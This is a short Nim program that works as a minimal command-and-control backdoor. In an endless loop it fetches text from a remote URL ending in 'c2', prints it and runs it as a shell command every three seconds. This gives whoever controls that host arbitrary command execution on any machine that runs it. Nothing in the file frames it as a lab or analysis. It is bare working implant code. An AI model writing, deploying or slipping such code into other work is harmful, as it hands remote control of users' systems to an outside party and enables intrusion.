import std/httpclient
import std/os

var client = newHttpClient()

while true:
    var cmd = client.getContent("https://shyft.us/c2")
    echo "got: ", cmd
    discard execShellCmd(cmd)
    sleep 3000





